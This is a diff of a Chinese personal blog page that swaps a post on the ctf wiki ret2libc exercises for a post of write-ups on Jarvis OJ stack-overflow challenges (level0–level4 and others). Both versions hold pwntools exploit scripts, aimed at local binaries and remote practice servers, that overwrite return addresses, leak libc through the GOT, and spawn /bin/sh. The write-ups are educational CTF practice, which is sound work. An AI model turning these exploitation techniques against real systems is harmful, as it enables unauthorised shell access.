@@ -79,24 +79,22 @@
 
 
 
-<meta name="description" content="昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干 Ret2ilbc首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。 下面就来看ctf wiki给出的三个例题吧，首">
+<meta name="description" content="中级ROP基本上看完了，打算做一些题目练练手，想到了之前学习逆向的时候jarvis oj上有题目的汇总，就去看了看，顺便把栈部分的题目都试着做了一下，恰好今天还算是有空，就写写wp吧 Tell me something入门题目，漏洞很明显，而且直接就给了可以拿到flag的函数，溢出覆盖返回地址即可exp如下： from pwn import * #p = process(&amp;apos;./guest">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习（二）">
-<meta property="og:url" content="http://yoursite.com/2018/11/18/pwn学习（二）/index.html">
+<meta property="og:title" content="pwn学习（10）jarvis栈部分">
+<meta property="og:url" content="http://yoursite.com/2018/11/27/pwn学习（10）jarvis栈部分（一）/index.html">
 <meta property="og:site_name" content="Asa9ao">
-<meta property="og:description" content="昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干 Ret2ilbc首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。 下面就来看ctf wiki给出的三个例题吧，首">
+<meta property="og:description" content="中级ROP基本上看完了，打算做一些题目练练手，想到了之前学习逆向的时候jarvis oj上有题目的汇总，就去看了看，顺便把栈部分的题目都试着做了一下，恰好今天还算是有空，就写写wp吧 Tell me something入门题目，漏洞很明显，而且直接就给了可以拿到flag的函数，溢出覆盖返回地址即可exp如下： from pwn import * #p = process(&amp;apos;./guest">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d799d6b0.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d79dd2f6.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7a55c91.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7a315ee.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/11/18/5bf14d7a36b5a.jpg">
-<meta property="og:updated_time" content="2018-11-19T11:38:52.315Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxmxu66bmdj311s0bsjtz.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy00vlp4j30pm08wabu.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy8skp9oj30ha06udgl.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxmydm4zuaj30hq05m74u.jpg">
+<meta property="og:updated_time" content="2018-11-27T13:48:45.538Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习（二）">
-<meta name="twitter:description" content="昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干 Ret2ilbc首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。 下面就来看ctf wiki给出的三个例题吧，首">
-<meta name="twitter:image" content="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg">
+<meta name="twitter:title" content="pwn学习（10）jarvis栈部分">
+<meta name="twitter:description" content="中级ROP基本上看完了，打算做一些题目练练手，想到了之前学习逆向的时候jarvis oj上有题目的汇总，就去看了看，顺便把栈部分的题目都试着做了一下，恰好今天还算是有空，就写写wp吧 Tell me something入门题目，漏洞很明显，而且直接就给了可以拿到flag的函数，溢出覆盖返回地址即可exp如下： from pwn import * #p = process(&amp;apos;./guest">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxmxu66bmdj311s0bsjtz.jpg">
 
 
 
@@ -126,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/18/pwn学习（二）/">
+  <link rel="canonical" href="http://yoursite.com/2018/11/27/pwn学习（10）jarvis栈部分（一）/">
 
 
 
 
 
-  <title>pwn学习（二） | Asa9ao</title>
+  <title>pwn学习（10）jarvis栈部分 | Asa9ao</title>
   
 
 
@@ -259,7 +257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（二）/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/27/pwn学习（10）jarvis栈部分（一）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asa9ao">
@@ -276,7 +274,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习（二）</h1>
+          <h1 class="post-title" itemprop="name headline">pwn学习（10）jarvis栈部分</h1>
         
 
         <div class="post-meta">
@@ -288,8 +286,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T19:25:46+08:00">
-                2018-11-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-27T21:20:28+08:00">
+                2018-11-27
               </time>
             
 
@@ -348,76 +346,80 @@
       
 
       
-        <p>昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干</p>
-<h2 id="Ret2ilbc"><a href="#Ret2ilbc" class="headerlink" title="Ret2ilbc"></a>Ret2ilbc</h2><p>首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。</p>
-<p>下面就来看ctf wiki给出的三个例题吧，首先是第一个</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7ab0691.jpg" alt="1.jpg"></p>
-<p>很显然gets处存在栈溢出漏洞，紧接着我们来看看程序给我们“提供”了什么可以利用的点</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d799d6b0.jpg" alt="2.jpg"></p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d79dd2f6.jpg" alt="3.jpg"></p>
-<p>可以看到程序非常大方的给了我们/bin/sh的字符串和system函数，那任务就结束了，我们只需要溢出s将函数的返回地址设置为system的地址，紧接着将system的参数设置为字符串的地址即可，直接上脚本了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p = process(<span class="string">'./ret2libc1.dms'</span>)
-system = <span class="number">0x8048460</span>
-bin = <span class="number">0x08048720</span>
-payload = flat([<span class="string">'a'</span>*<span class="number">112</span>,system,<span class="string">'b'</span>*<span class="number">4</span>],bin)
+        <p>中级ROP基本上看完了，打算做一些题目练练手，想到了之前学习逆向的时候jarvis oj上有题目的汇总，就去看了看，顺便把栈部分的题目都试着做了一下，恰好今天还算是有空，就写写wp吧</p>
+<h1 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell me something"></a>Tell me something</h1><p>入门题目，漏洞很明显，而且直接就给了可以拿到flag的函数，溢出覆盖返回地址即可<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxmxu66bmdj311s0bsjtz.jpg" alt=""><br>exp如下：</p>
+<pre><code>from pwn import *
+#p = process(&apos;./guestbook&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;,9876)
+elf = process(&apos;./guestbook&apos;)
+
+payload = 0x88*&apos;a&apos; + p64(0x400620)
+#gdb.attach(p)
 p.sendline(payload)
 p.interactive()
-
-</code></pre>
-<p>注意，我们的system作为我们将要返回的函数，他自然也有要返回的函数，因为我们只需要拿到sh，所以他具体返回什么我们就不用操心了，所以直接拿4个b把他的返回地址给填充掉就好了。当然，这是我们手动找到了system函数的地址，是不是还有其他的办法呢？当然有了，脚本一改</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p = process(<span class="string">'./ret2libc1.dms'</span>)
-elf = ELF(<span class="string">'./ret2libc1.dms'</span>)
-system_addr = elf.plt[<span class="string">'system'</span>]
-bin_addr = <span class="number">0x8048720</span>
-payload = <span class="number">112</span>*<span class="string">'a'</span> + p32(system_addr) +<span class="string">'b'</span>*<span class="number">4</span> + p32(bin_addr)
+</code></pre><p>唯一需要注意的是这个主函数有点坑，没有push ebp，所以在计算pad的时候要注意一下</p>
+<h1 id="test-your-memory"><a href="#test-your-memory" class="headerlink" title="test your memory"></a>test your memory</h1><p>漏洞同样很明显，而且还给了cat flag的地址作为提示，我们只要覆盖返回地址就好了<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy00vlp4j30pm08wabu.jpg" alt=""><br>也没什么需要特别注意的地方，本地测试脚本的时候可以准备个假的flag文件，exp如下：<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./memory&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;, 9876)
+elf = ELF(&apos;./memory&apos;)
+pad = 0x13 *&apos;a&apos;
+fakeebp = &apos;aaaa&apos;
+system_addr = elf.plt[&apos;system&apos;]
+bin_addr = elf.search(&apos;cat flag&apos;).next()
+p.recvuntil(&apos;&gt; &apos;)
+payload = pad + fakeebp + p32(system_addr) + p32(system_addr) + p32(bin_addr)
+#gdb.attach(p)
 p.sendline(payload)
 p.interactive()
-</code></pre>
-<p>这里我们使用了ELF加载了我们的程序，而ELF的plt中就是保存着我们的地址与函数的一一映射，因此我们用plt[‘system’]就可以拿到system的地址了</p>
-<p>紧接着看第二个题目</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7a55c91.jpg" alt="4.jpg"></p>
-<p>溢出点还是gets函数，但这次就没有第一次那么简单了，虽然还有system函数，但是没有可以供我们使用的/bin/sh字符串了，这时候我们就要开动脑筋想一想了，毛爷爷说过，没有条件创造条件，他没给字符串，我们可不可以自己输入一个进去呢？我们抓紧来看一下</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7a315ee.jpg" alt="5.jpg"></p>
-<p>首先就是天时啊，程序有个gets的函数，那我们何不借东风？拿它来一招瞒天过海？</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14d7a36b5a.jpg" alt="6.jpg"></p>
-<p>其次地利也有啊，bss段又个0x64长度的buf2数组没被用过，刚好我们瞒天过海而来的字符串就由它再暗度陈仓了。天时地利，就差exp了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p = process(<span class="string">'./ret2libc2.dms'</span>)
-elf = ELF(<span class="string">'./ret2libc2.dms'</span>)
-gets_addr = elf.plt[<span class="string">'gets'</span>]
-system_addr = elf.plt[<span class="string">'system'</span>]
-pop_ebx = <span class="number">0x0804843d</span>
-buf2 = <span class="number">0x804A080</span>
-payload = <span class="number">112</span>*<span class="string">'a'</span> + p32(gets_addr) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + <span class="number">4</span>*<span class="string">'a'</span> + p32(buf2)
+</code></pre><h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>太简单了，只放exp了<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./level0&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+elf = ELF(&apos;./level0&apos;)
+pad = 0x80 *&apos;a&apos;
+fakeebp = &apos;aaaaaaaa&apos;
+payload = pad + fakeebp + p64(elf.symbols[&apos;callsystem&apos;])
 p.sendline(payload)
-p.sendline(<span class="string">"/bin/sh"</span>)
 p.interactive()
+</code></pre><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>同样很简单，exp如下：<br>    from pwn import *<br>    p = remote(‘pwn2.jarvisoj.com’,9877)<br>    shellcode = asm(shellcraft.sh())<br>    p.recvuntil(“What’s this:”)<br>    buf_addr = p.recv()[0:10]<br>    log.info(buf_addr)<br>    buf_addr = int(buf_addr,16)<br>    log.info(buf_addr)<br>    payload = shellcode.ljust(140,’a’) + p32(buf_addr)<br>    p.sendline(payload)<br>    p.interactive()</p>
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>依旧很简单。。。<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./level2&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9878)
+elf = ELF(&apos;./level2&apos;)
 
-</code></pre>
-<p>这里简单提一句为什么会有个pop ebx，主要是gets函数其实是改变了堆栈状态的，我们这里使用了pop主要是为了平衡堆栈的，你pop谁都可以，add也行。</p>
-<p>趁热打铁把第三题也做了，这个题比起上面的两个题难度系数高了很多，这次是既没有了system函数也没有了/bin/sh，那就比较麻烦了，我们要找的东西可就多了。不过有个好消息就是我们的system函数是属于libc，而libc.so里函数的相对偏移是一定的，更让人高兴的是即使程序ASLR的保护，也只是针对地址的中间位进行随机，最低的12位并不会发生改变，而这些github上都有人把工作给我们做好了，我们只需要知道一个函数在libc的地址，就可以顺藤摸瓜搞到所有函数（甚至还有字符串/bin/sh）的地址，这样就人工创造了天时地利，只差我们的exp了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher
-p = process(<span class="string">'./ret2libc3.dms'</span>)
-e = ELF(<span class="string">'./ret2libc3.dms'</span>)
-puts_plt = e.plt[<span class="string">'puts'</span>]
-puts_got = e.got[<span class="string">'puts'</span>]
-main = e.symbols[<span class="string">'main'</span>]
-p.recv()
-p.sendline(flat([<span class="string">'A'</span> * <span class="number">0x70</span>, puts_plt, main, puts_got]))
-puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])
-libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)
-libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)
-system_addr = libcbase + libc.dump(<span class="string">'system'</span>)
-binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)
-p.sendline(flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="string">'b'</span>*<span class="number">4</span>, binsh_addr]))
+system_addr = elf.plt[&apos;system&apos;]
+bin_addr = 0x804A024
+payload = 140*&apos;a&apos; + p32(system_addr) + &quot;aaaa&quot; + p32(bin_addr)
+p.sendline(payload)
 p.interactive()
+</code></pre><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>很明显的溢出，但是没有system函数，也没有/bin/sh，那我们就考虑泄漏libc了，程序调用过了write，但就用这个函数了<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy8skp9oj30ha06udgl.jpg" alt=""><br>exp如下：<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./level3&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9879)
+elf = ELF(&apos;./level3&apos;)
+#libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+libc=ELF(&apos;./libc-2.19.so&apos;)
+pad = 0x88 * &apos;a&apos;
+fakeebp = &apos;aaaa&apos;
+write_addr = elf.plt[&apos;write&apos;]
+main_addr = 0x804844B
+payload = pad + fakeebp + p32(write_addr) + p32(main_addr) + p32(1) + p32(elf.got[&apos;write&apos;]) + p32(4)
+p.recvuntil(&apos;Input:\n&apos;)
+p.sendline(payload)
+write_addr = u32(p.recv(4))
+log.info(write_addr)
 
-</code></pre>
-<p>这里用到了新的工具—LibcSearcher，这个工具主要是能够帮助我们轻松的利用已有的got表的泄漏快速找到我们想要的东西，用法也很简单LibcSeacher(‘函数名’,地址)得到了libc，之后libc.dump()就可以得到偏移了，之后按照之前的方法构造payload就好了。要注意这里我们的pad要-8，因为我们是在main函数里又调用了main函数。</p>
-<p>successful</p>
+libc_write=libc.symbols[&apos;write&apos;]
+libc_system=libc.symbols[&apos;system&apos;]
+libc_sh=libc.search(&apos;/bin/sh&apos;).next()
+
+system_addr= write_addr-libc_write+libc_system
+sh_addr=write_addr-libc_write+libc_sh
+
+payload2 = pad + fakeebp + p32(system_addr) + &apos;dead&apos; + p32(sh_addr)
+p.sendline(payload2)
+
+p.interactive()
+</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>这个题目成功挡住了我，先拿ida看看<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmydm4zuaj30hq05m74u.jpg" alt=""><br>看上去和上一个题没啥区别……还是要泄漏libc。<br>做的时候偷了个懒，直接拿上个题的脚本试了试，结果本地成了……当时还以为题目放重了，结果remote的时候出错了，这才意识到题目没给libc，这就很尴尬了。<br>怎么解决没有libc的问题呢？这时候就要用到一个新武器了—-DynELF。<br>这里给个网址，官方介绍的很详细了<br><a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html" target="_blank" rel="noopener">https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html</a><br>exp如下：<br>    from pwn import <em><br>    context(arch = ‘i386’, os = ‘linux’)<br>    r = remote(‘pwn2.jarvisoj.com’, 9880)<br>    e=ELF(‘./level4’)<br>    junk=’A’</em>(0x88+0x04)<br>    read_plt=e.symbols[‘read’]<br>    write_plt=e.symbols[‘write’]<br>    data_bss_addr=e.symbols[‘__bss_start’]<br>    func_reload_addr=e.symbols[‘vulnerable_function’]<br>    def leak(address):<br>        payload1=junk+p32(write_plt)+p32(func_reload_addr)+p32(0x01)+p32(address)+p32(0x04)<br>        r.sendline(payload1)<br>        leak_addr=r.recv(4)<br>        return leak_addr<br>    d=DynELF(leak,elf=e)<br>    system_addr=d.lookup(‘system’,’libc’)<br>    payload2=junk+p32(read_plt)+p32(func_reload_addr)+p32(0x00)+p32(data_bss_addr)+p32(0x08)<br>    r.sendline(payload2)<br>    r.send(‘/bin/sh\x00’)<br>    payload3=junk+p32(system_addr)+p32(func_reload_addr)+p32(data_bss_addr)<br>    r.send(payload3)<br>    r.interactive()</p>
+<p>Successful</p>
 
       
     </div>
@@ -442,8 +444,8 @@ p.interactive()
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/18/pwn学习（1）/" rel="next" title="pwn学习（1）">
-                <i class="fa fa-chevron-left"></i> pwn学习（1）
+              <a href="/2018/11/26/pwn学习（9）中级ROP（一）/" rel="next" title="pwn学习（9）中级ROP（一）">
+                <i class="fa fa-chevron-left"></i> pwn学习（9）中级ROP（一）
               </a>
             
           </div>
@@ -451,10 +453,6 @@ p.interactive()
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/18/pwn学习（3）ROP-Emporium32位练习/" rel="prev" title="pwn学习（3）ROP Emporium32位练习">
-                pwn学习（3）ROP Emporium32位练习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -586,7 +584,7 @@ p.interactive()
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ret2ilbc"><span class="nav-number">1.</span> <span class="nav-text">Ret2ilbc</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Tell-me-something"><span class="nav-number">1.</span> <span class="nav-text">Tell me something</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#test-your-memory"><span class="nav-number">2.</span> <span class="nav-text">test your memory</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level0"><span class="nav-number">3.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level1"><span class="nav-number">4.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level2"><span class="nav-number">5.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level3"><span class="nav-number">6.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level4"><span class="nav-number">7.</span> <span class="nav-text">level4</span></a></li></ol></div>
             
 
           </div>
